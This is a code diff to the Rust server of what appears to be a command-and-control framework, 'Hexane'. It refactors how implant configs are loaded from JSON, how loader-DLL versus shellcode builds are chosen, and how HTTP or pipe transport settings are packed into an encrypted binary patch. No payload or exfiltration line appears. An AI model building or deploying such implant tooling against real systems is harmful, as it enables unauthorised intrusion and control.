@@ -1,20 +1,17 @@
+use std::fs;
 use rand::Rng;
 use std::str::FromStr;
 
 use crate::server::INSTANCES;
-use crate::server::session::{SESSION, USERAGENT};
-use crate::server::types::{InjectionOptions, NetworkOptions, TRANSPORT_PIPE, TRANSPORT_HTTP, Config, Compiler, Network, Builder, Loader, UserSession, TransportType};
+use crate::server::session::{CURDIR, SESSION, USERAGENT};
+use crate::server::types::{InjectionOptions, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, TransportType, JsonData};
 use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::error::{Error, Result};
 use crate::server::utils::wrap_message;
-use crate::server::config::map_config;
 use crate::server::stream::Stream;
 
 use crate::{return_error, length_check_defer};
-
-const BUILD_DLL: u32 = 0;
-const BUILD_SHC: u32 = 1;
-
+use crate::server::types::TransportType::TransportHttp;
 
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     length_check_defer!(args, 3);
@@ -30,7 +27,7 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     instance.user_session.username = session.username.clone();
     instance.user_session.is_admin = session.is_admin.clone();
 
-    if instance.network_type != *TRANSPORT_PIPE {
+    if instance.network_type != TransportHttp as u8 {
         instance.setup_listener()?;
     }
 
@@ -39,6 +36,24 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     // todo: insert to db
 
     Ok(())
+}
+
+pub fn map_config(file_path: &String) -> Result<Hexane> {
+    let json_file = CURDIR.join("json").join(file_path);
+
+    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
+    let json_data   = serde_json::from_str::<JsonData>(contents.as_str())?;
+
+    let mut instance = Hexane::default();
+
+    instance.group_id       = 0;
+    instance.main           = json_data.config;
+    instance.network        = json_data.network;
+    instance.builder        = json_data.builder;
+    instance.loader         = json_data.loader;
+    instance.user_session   = UserSession::default();
+
+    Ok(instance)
 }
 
 pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
@@ -63,7 +78,8 @@ pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
     // todo: get channels + saved messages from db
 }
 
-#[derive(Debug)]
+
+#[derive(Debug, Default)]
 pub struct Hexane {
     pub(crate) current_taskid:  u32,
     pub(crate) peer_id:         u32,
@@ -169,7 +185,7 @@ impl Hexane {
         }
 
         if let Some(loader) = &mut self.loader {
-            self.build_type = BUILD_DLL;
+            self.build_type = BuildType::BuildLoader as u32;
 
             if loader.root_directory.is_empty() { return_error!("loader field detected but root_directory must be provided")}
             if loader.sources.is_empty()        { return_error!("loader field detected but sources must be provided")}
@@ -196,7 +212,7 @@ impl Hexane {
                 }
             }
         } else {
-            self.build_type = BUILD_SHC;
+            self.build_type = BuildType::BuildShellcode as u32;
         }
 
         Ok(())
@@ -218,8 +234,8 @@ impl Hexane {
     fn create_binary_patch(&self) -> Result<Vec<u8>> {
         let mut stream = Stream::new();
 
-        if self.network_type == TransportType::TransportHttp as u8 {
-            stream.pack_byte(TransportType::TransportHttp as u8);
+        if self.network_type == TransportHttp as u8 {
+            stream.pack_byte(TransportHttp as u8);
 
         } else if self.network_type == TransportType::TransportPipe as u8 {
             stream.pack_byte(TransportType::TransportPipe as u8);
@@ -299,3 +315,4 @@ impl Hexane {
         Ok(stream.buffer)
     }
 }
+
